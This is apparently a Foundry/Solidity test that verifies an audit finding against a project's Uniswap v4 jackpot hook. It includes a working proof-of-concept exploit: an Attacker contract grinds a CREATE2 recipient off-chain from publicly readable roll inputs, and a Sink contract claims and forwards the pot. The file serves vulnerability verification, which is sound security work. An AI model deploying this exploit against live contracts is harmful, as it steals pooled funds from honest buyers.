// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {HookrLaunchpad} from "../src/HookrLaunchpad.sol";
import {HookrHook} from "../src/HookrHook.sol";
import {HookMiner} from "./utils/HookMiner.sol";

/// @notice INDEPENDENT verification of the "jackpot roll is attacker-determined" finding.
///         Unlike the reported PoC (which brute-forces with in-transaction reverted retries),
///         this proves the cheaper production attack: every roll input is publicly readable
///         BEFORE the transaction, so the attacker grinds the winning recipient OFF-CHAIN and
///         lands the pot with ONE ordinary swap and ZERO wasted attempts.
contract ZZVerifyJackpotRng is Test {
    uint160 constant HOOK_FLAGS = uint160((1 << 13) | (1 << 7) | (1 << 3));
    IPoolManager constant pm = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);
    uint256 constant POT_NONCE_SLOT = 9;

    HookrLaunchpad pad;
    HookrHook hook;
    PoolSwapTest router;

    address creator = address(0xC0FFEE);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        vm.createSelectFork("robinhood");
        pad = new HookrLaunchpad(pm);
        bytes memory creation = abi.encodePacked(type(HookrHook).creationCode, abi.encode(address(pm), address(pad)));
        (address predicted, bytes32 salt) = HookMiner.find(address(this), HOOK_FLAGS, creation);
        hook = new HookrHook{salt: salt}(pm, address(pad));
        require(address(hook) == predicted, "mine");
        pad.setHook(hook);
        router = new PoolSwapTest(pm);
        vm.deal(creator, 1000 ether);
        vm.deal(alice, 1000 ether);
        vm.deal(bob, 1000 ether);
    }

    function _graduate(uint32 odds) internal returns (PoolKey memory key) {
        HookrLaunchpad.LaunchArgs memory a;
        a.name = "Pot";
        a.symbol = "POT";
        a.targetRaiseWei = 0.01 ether;
        a.custom.baseFeePips = 3000;
        a.custom.maxFeePips = 3000;
        a.custom.potBps = 500;
        a.custom.potOdds = odds;
        a.custom.potMinBuyWei = 1e12;

        uint256 f = pad.creationFeeWei();
        vm.prank(creator);
        address token = pad.launch{value: f}(a);
        vm.prank(alice);
        pad.buy{value: 0.05 ether}(token, 0);
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(token),
            fee: 0x800000,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });
    }

    function _buy(address who, PoolKey memory key, uint256 ethIn, address recipient) internal {
        vm.prank(who);
        router.swap{value: ethIn}(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethIn), sqrtPriceLimitX96: 4295128740}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            abi.encode(recipient)
        );
    }

    /// @dev Replicates _rollJackpot exactly, using only values an outside observer can read.
    function _roll(address recipient, uint256 nonceAfterIncrement, uint256 pot) internal view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), recipient, nonceAfterIncrement, address(hook), pot)
            )
        );
    }

    /// PART 1 — every roll input is public. Grind a winner off-chain, win on the FIRST swap.
    function test_jackpot_winnerIsPrecomputable_oneSwapNoRetries() public {
        PoolKey memory key = _graduate(1000); // advertised 1-in-1000
        vm.roll(block.number + 20);

        // honest buyers fund the pot
        for (uint256 i = 0; i < 5; i++) {
            _buy(bob, key, 0.002 ether, bob);
        }
        uint256 pot = hook.potWei(key.toId());
        assertGt(pot, 0);

        // ---- everything below is what an off-chain searcher does with public data only ----
        // potNonce is `internal` but plainly readable with eth_getStorageAt.
        uint256 nonce = uint256(vm.load(address(hook), bytes32(POT_NONCE_SLOT)));
        console2.log("public potNonce (slot 9)", nonce);

        // The fee cut of our own buy lands in the pot BEFORE the roll reads it, so model that.
        uint256 ethIn = 0.0015 ether;
        uint256 hookFee = (ethIn * 500) / 10_000; // burnBps+lpBps+potBps == potBps == 500
        uint256 potAtRoll = pot + hookFee; // royaltyBps == 0, burn/lp off -> whole cut is the pot
        console2.log("pot the roll will see", potAtRoll);

        // Grind a counterfactual CREATE2 recipient that wins.
        Attacker atk = new Attacker(hook, router);
        vm.deal(address(atk), 10 ether);
        bytes32 winningSalt;
        address winner;
        bool found;
        for (uint256 s = 0; s < 200_000; s++) {
            address cand = atk.predict(bytes32(s));
            if (_roll(cand, nonce + 1, potAtRoll) % 1000 == 0) {
                winningSalt = bytes32(s);
                winner = cand;
                found = true;
                console2.log("winning salt found offline at iteration", s);
                break;
            }
        }
        assertTrue(found, "offline grind failed");

        // ---- ONE honest-looking swap. No reverts, no retries, no privileged position. ----
        uint256 gasBefore = gasleft();
        atk.buy(key, ethIn, winner);
        console2.log("gas for the single winning swap", gasBefore - gasleft());

        assertEq(hook.claimableWei(winner), potAtRoll, "predicted winner credited the whole pot");
        assertEq(hook.potWei(key.toId()), 0, "pot drained on the first and only attempt");

        uint256 before = address(atk).balance;
        atk.collect(winningSalt, winner);
        assertEq(address(atk).balance, before + potAtRoll, "ETH really extracted");
        console2.log("ETH extracted on attempt #1 (wei)", potAtRoll);
    }

    /// PART 2 — control: an honest buyer at 1-in-1000 does NOT win. Rules out "the pot just
    /// always pays out" / a broken-odds artifact of the harness.
    function test_control_honestBuyerAtSameOddsDoesNotWin() public {
        PoolKey memory key = _graduate(1000);
        vm.roll(block.number + 20);
        for (uint256 i = 0; i < 30; i++) {
            _buy(bob, key, 0.002 ether, bob);
        }
        assertEq(hook.claimableWei(bob), 0, "honest buyer won nothing in 30 buys");
        assertGt(hook.potWei(key.toId()), 0, "pot still standing for the honest cohort");
        console2.log("honest pot after 30 buys (wei)", hook.potWei(key.toId()));
    }

    /// PART 3 — the roll is not even sequencer-dependent: it wins identically at ANY blockhash,
    /// because the attacker regrinds per block. Shows the in-code "sequencer could influence it"
    /// disclosure does not describe this.
    function test_attackSurvivesArbitraryBlockhash() public {
        PoolKey memory key = _graduate(100);
        vm.roll(block.number + 20);
        for (uint256 i = 0; i < 5; i++) {
            _buy(bob, key, 0.002 ether, bob);
        }
        Attacker atk = new Attacker(hook, router);
        vm.deal(address(atk), 100 ether);

        uint256 wins;
        for (uint256 round = 0; round < 5; round++) {
            vm.roll(block.number + 1);
            uint256 pot = hook.potWei(key.toId());
            if (pot == 0) {
                _buy(bob, key, 0.002 ether, bob);
                pot = hook.potWei(key.toId());
            }
            uint256 nonce = uint256(vm.load(address(hook), bytes32(POT_NONCE_SLOT)));
            uint256 ethIn = 0.0015 ether;
            uint256 potAtRoll = pot + (ethIn * 500) / 10_000;
            for (uint256 s = round * 1_000_000; s < round * 1_000_000 + 100_000; s++) {
                address cand = atk.predict(bytes32(s));
                if (_roll(cand, nonce + 1, potAtRoll) % 100 == 0) {
                    atk.buy(key, ethIn, cand);
                    assertEq(hook.claimableWei(cand), potAtRoll);
                    wins++;
                    break;
                }
            }
        }
        assertEq(wins, 5, "won every single round regardless of blockhash");
        console2.log("consecutive forced jackpot wins", wins);
    }
}

contract Attacker {
    HookrHook public immutable hook;
    PoolSwapTest public immutable router;

    constructor(HookrHook h, PoolSwapTest r) {
        hook = h;
        router = r;
    }

    receive() external payable {}

    function predict(bytes32 salt) public view returns (address) {
        return address(
            uint160(
                uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(type(Sink).creationCode))))
            )
        );
    }

    function buy(PoolKey calldata key, uint256 ethIn, address recipient) external {
        router.swap{value: ethIn}(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethIn), sqrtPriceLimitX96: 4295128740}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            abi.encode(recipient)
        );
    }

    function collect(bytes32 salt, address expected) external {
        Sink s = new Sink{salt: salt}();
        require(address(s) == expected, "mismatch");
        s.pull(hook, payable(address(this)));
    }
}

contract Sink {
    function pull(HookrHook hook, address payable to) external {
        hook.claim();
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "fwd");
    }

    receive() external payable {}
}
